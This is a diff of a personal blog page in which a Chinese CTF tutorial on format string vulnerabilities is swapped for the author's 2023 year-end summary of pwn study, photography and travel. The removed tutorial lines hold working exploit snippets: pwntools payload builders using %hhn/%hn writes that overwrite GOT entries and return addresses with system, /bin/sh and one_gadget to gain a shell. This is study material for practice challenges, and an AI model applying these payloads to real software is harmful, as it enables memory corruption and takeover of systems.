@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="《格式化字符串》, StarrySky">
+    <meta name="keywords" content="2023年终总结, StarrySky">
     <meta name="description" content="Love rises from the east and descends to the west,romance makes no changes until death.">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>《格式化字符串》 | StarrySky</title>
+    <title>2023年终总结 | StarrySky</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -231,7 +231,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">《格式化字符串》</h1>
+                    <h1 class="description center-align post-title">2023年终总结</h1>
                 </div>
             </div>
         </div>
@@ -347,27 +347,14 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/pwn/">
-                                <span class="chip bg-color">pwn</span>
-                            </a>
-                        
-                            <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
-                                <span class="chip bg-color">格式化字符串</span>
+                            <a href="/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/">
+                                <span class="chip bg-color">年终总结</span>
                             </a>
                         
                     </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/pwn/" class="post-category">
-                                pwn
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -376,28 +363,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-06-20
+                    2023-12-27
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-06-20
+                    2024-01-01
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    917
+                    508
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    1 分
                 </div>
                 
 
@@ -415,116 +402,17 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h2><pre class="line-numbers language-none"><code class="language-none">%[parameter][flags][field width][.precision][length]type<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<ul>
-<li>使用以<code>%</code>开头的格式说明符占位，在后面参数列表中提供相应变量</li>
-<li><code>c</code>，把 int 参数转为 unsigned char 型输出</li>
-<li><code>p</code>， void * 型，printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址</li>
-<li><code>n</code>，不输出字符，将该字符之前的字符数量写入参数中</li>
-</ul>
-<h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><p>利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作</p>
-<ul>
-<li>泄露栈内存<ul>
-<li>获取某个变量的值</li>
-<li>获取某个变量对应地址的内存</li>
-</ul>
-</li>
-<li>泄露任意地址内存<ul>
-<li>利用 <code>GOT</code> 表得到 <code>libc</code> 函数地址，进而获取 <code>libc</code>，进而获取其它 <code>libc</code> 函数地址</li>
-<li>盲打，<code>dump</code> 整个程序，获取有用信息。</li>
-</ul>
-</li>
-</ul>
-<h2 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h2><p>payload：<code>‘%’ + str(target_addr) + &#39;c%offset$n&#39;</code></p>
-<ul>
-<li><code>hhn</code>:1字节（2位</li>
-<li><code>hn</code>：2字节（4位</li>
-<li><code>n</code>：4字节（8位</li>
-</ul>
-<h3 id="栈上的格式化字符串"><a href="#栈上的格式化字符串" class="headerlink" title="栈上的格式化字符串"></a>栈上的格式化字符串</h3><h4 id="确定偏移offset"><a href="#确定偏移offset" class="headerlink" title="确定偏移offset"></a>确定偏移offset</h4><p>在<code>printf</code>下断点，利用<code>fmtarg</code>工具获取偏移</p>
-<h4 id="修改内存函数基本构造"><a href="#修改内存函数基本构造" class="headerlink" title="修改内存函数基本构造"></a>修改内存函数基本构造</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fmt1</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span> word<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span>
-        result <span class="token operator">=</span> word <span class="token operator">-</span> prev
-        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>
-    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span>
-        result <span class="token operator">=</span> <span class="token number">0</span>
-    <span class="token keyword">else</span><span class="token punctuation">:</span>
-        result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev
-        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>
-    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>
-    <span class="token keyword">return</span> fmtstr
+                <p>–starrysky平平无奇却又热烈精彩的18岁</p>
+<h3 id="关于pwn"><a href="#关于pwn" class="headerlink" title="关于pwn"></a>关于pwn</h3><p>年初学完了栈的大部分基础知识，寒假在队长的指导下开始接触堆，堆的源码阅读和<code>how2heap</code>都看了几个月，但最后也成功看完啦。目前主要计划是继续训练，通过<code>buuctf</code>的题目和比赛的复现来巩固和补充堆栈知识，这一步做的差不多以后计划开始学习系统安全。这一年参加了很多比赛，下至新生赛，上至各种线下赛，从充人数到年底的香山杯决赛自己拿了名次。2024要继续加油啊</p>
+<h3 id="关于摄影"><a href="#关于摄影" class="headerlink" title="关于摄影"></a>关于摄影</h3><p>除了计算机最大的兴趣就是摄影了吧，但其实上了大学没什么时间去练习，只有出去旅游比赛有时间真正去好好拍一些照片。我喜欢自然风光摄影，但是来年有时间想试试欧根纱拍人像，虽然一开始买尼康就是为了拍自然风光。下面是一些我觉得拍的还不错的，拍摄地：盐城电影院、南京牛首山、北京天安门</p>
 
 
-<span class="token keyword">def</span> <span class="token function">fmt2</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> size<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    payload <span class="token operator">=</span> <span class="token string">""</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
-            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>
-        <span class="token keyword">else</span><span class="token punctuation">:</span>
-            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>
-    prev <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> offset <span class="token operator">+</span> i<span class="token punctuation">)</span>
-        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>
-    <span class="token keyword">return</span> payload
-payload <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x0804A028</span><span class="token punctuation">,</span><span class="token number">0x12345678</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>32位时自带函数：<code>fmtstr_payload(偏移，&#123;被改的got：要改的plt&#125;)</code></p>
-<h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ul>
-<li>泄露libc等所需地址</li>
-<li>将需要修改的地址写入栈</li>
-<li>获取写入</li>
-</ul>
-<h3 id="非栈上格式化字符串漏洞"><a href="#非栈上格式化字符串漏洞" class="headerlink" title="非栈上格式化字符串漏洞"></a>非栈上格式化字符串漏洞</h3><p>技巧：1.改<code>ret</code>地址中的<code>libc_start_main</code>为<code>ogg</code></p>
-<p>​          2.改<code>printf_got</code>为<code>system/ogg</code></p>
-<p>​          3.泄露<code>stack</code>地址的时候如果<code>ebp</code>地址不对就用和<code>ebp</code>连接的地址一样的地址</p>
-<pre class="line-numbers language-none"><code class="language-none">sys1 &#x3D; system &amp; 0xff #取低字节
-sys2 &#x3D; (system&gt;&gt;8) &amp; 0xffff #取第二三字节 
-gift_addr &#x3D; gift &amp; 0xffff #取低二字节
-p4 &#x3D; &#39;%&#39; + str(sys1) + &#39;c%8$hhn&#39; + &#39;%&#39; + str((gift_addr) - (sys1)) + &#39;c%9$hn&#39; + &#39;%&#39; + str(sys2-gift_addr) + &#39;c%10$hn&#39; 
-r.sendlineafter(&#39;gift for you: \n&#39;,p4)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>若需分两次改则需要两条链，当第二次发送的数据小于第一次发送的数据时，要加<code>0x10000</code></p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#简单的格式化字符串利用函数，将dest地址的后8字节循环更改成ptr对应的字节，off1与off2为上述（1）与（2）两个栈地址在格式化字符串中的偏移</span>
-<span class="token keyword">def</span> <span class="token function">overlap</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span>ptr<span class="token punctuation">,</span>off1<span class="token punctuation">,</span>off2<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    d<span class="token operator">=</span>dest<span class="token operator">&amp;</span><span class="token number">0xff</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">if</span> <span class="token keyword">not</span> ptr<span class="token punctuation">:</span>
-            <span class="token keyword">break</span>
-        payload<span class="token operator">=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>off1<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'$hhn'</span>
-        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
-        f<span class="token operator">=</span>ptr<span class="token operator">&amp;</span><span class="token number">0xff</span>
-        payload<span class="token operator">=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>off2<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'$hhn'</span>
-        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
-        d<span class="token operator">+=</span><span class="token number">1</span>
-        ptr<span class="token operator">>></span><span class="token operator">=</span><span class="token number">8</span>
 
-ret<span class="token operator">=</span>rsp<span class="token operator">+</span><span class="token number">0x18</span>
-ptr<span class="token operator">=</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x21112</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token comment">#通过将第25个参数传入格式化字符串，将第39个参数的值改为返回地址</span>
-payload<span class="token operator">=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>ret<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'$hn'</span>
-p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
-<span class="token comment">#覆盖返回地址为ptr（pop_rdi; ret）</span>
-overlap<span class="token punctuation">(</span>ret<span class="token punctuation">,</span>ptr<span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span>
-<span class="token comment">#覆盖返回地址+8的位置为binsh字符串地址</span>
-overlap<span class="token punctuation">(</span>ret<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span>
-<span class="token comment">#覆盖返回地址+16的位置为system函数的地址</span>
-overlap<span class="token punctuation">(</span>ret<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span>
-<span class="token comment">#至此，退出循环执行ROP后即可获取系统操作权限</span>
-p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<ul>
-<li><p>泄露<code>libc</code>：<code>__libc_start_main</code></p>
-</li>
-<li><p>修改：<code>payload = (b&#39;%&#39; + bytes(str(one1), encoding=&#39;utf-8&#39;) + b&#39;c%8$hn&#39;).ljust(16, b&#39;a&#39;) + p64(exit_addr)</code>，分多次修改每次<code>sleep(0.5)</code></p>
-</li>
-<li><pre><code class="python">num = 12345
-num_bytes = num.to_bytes(2, byteorder=&#39;little&#39;)		#转换为字节序列
-</code></pre>
-</li>
-</ul>
+<h3 id="关于生活"><a href="#关于生活" class="headerlink" title="关于生活"></a>关于生活</h3><p>这一年创建了自己的个人博客，拿到了驾照，学习了做甜品，退了学生会和电视台，和队长一起做了宣传海报和ppt，考了普通话和四级，看了演唱会和天安门升旗，去了很多城市：南京、合肥、深圳、中山、常州、北京，经历了很多前十八年都没做过的事：和队友两个人飞去隔着半个中国的地方、到每个班级进行团队宣讲和招新、通宵打比赛、参与实习面试…是磨练也是难忘的回忆。</p>
+<p>学业上这一年可能是有点划水了，其他事情也很多，对不感兴趣的学科也不怎么学的下去，还有几周就期末考试了，冲一下二等奖学金吧。</p>
 
                 
             </div>
@@ -539,12 +427,8 @@ num_bytes = num.to_bytes(2, byteorder=&#39;little&#39;)		#转换为字节序列
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/pwn/">
-                                    <span class="chip bg-color">pwn</span>
-                                </a>
-                            
-                                <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
-                                    <span class="chip bg-color">格式化字符串</span>
+                                <a href="/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/">
+                                    <span class="chip bg-color">年终总结</span>
                                 </a>
                             
                         </div>
@@ -589,33 +473,29 @@ num_bytes = num.to_bytes(2, byteorder=&#39;little&#39;)		#转换为字节序列
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/07/12/leetcode-shua-ti-chi-xu-geng-xin/leetcode-shua-ti-chi-xu-geng-xin/">
+                <a href="/2023/12/27/nian-zhong-zong-jie/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/Steel%20Gray.jpg" class="responsive-img" alt="leetcode刷题（持续更新)">
+                        <img src="/medias/featureimages/Steel%20Gray.jpg" class="responsive-img" alt="2023年终总结">
                         
-                        <span class="card-title">leetcode刷题（持续更新)</span>
+                        <span class="card-title">2023年终总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            leetcode刷题记录
+                            关于我的2023
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-12
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-12-27
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E7%AE%97%E6%B3%95/" class="post-category">
-                                    算法
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            StarrySky
                             
                         </span>
                     </div>
@@ -623,8 +503,8 @@ num_bytes = num.to_bytes(2, byteorder=&#39;little&#39;)		#转换为字节序列
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%AE%97%E6%B3%95/">
-                        <span class="chip bg-color">算法</span>
+                    <a href="/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/">
+                        <span class="chip bg-color">年终总结</span>
                     </a>
                     
                 </div>
@@ -638,31 +518,31 @@ num_bytes = num.to_bytes(2, byteorder=&#39;little&#39;)		#转换为字节序列
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/">
+                <a href="/2023/12/16/buuctf-shua-ti-chi-xu-geng-xin/buuctf-shua-ti-chi-xu-geng-xin/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/Steel%20Gray.jpg" class="responsive-img" alt="《CSAPP》阅读笔记（持续更新）">
+                        <img src="/medias/featureimages/Steel%20Gray.jpg" class="responsive-img" alt="buuctf刷题（持续更新）">
                         
-                        <span class="card-title">《CSAPP》阅读笔记（持续更新）</span>
+                        <span class="card-title">buuctf刷题（持续更新）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            深入理解计算机系统笔记
+                            buuctf刷题记录
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-05-04
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-12-16
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/" class="post-category">
-                                    计算机系统
+                            <a href="/categories/pwn/" class="post-category">
+                                    pwn
                                 </a>
                             
                             
@@ -672,8 +552,8 @@ num_bytes = num.to_bytes(2, byteorder=&#39;little&#39;)		#转换为字节序列
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/">
-                        <span class="chip bg-color">计算机系统</span>
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
                     </a>
                     
                 </div>
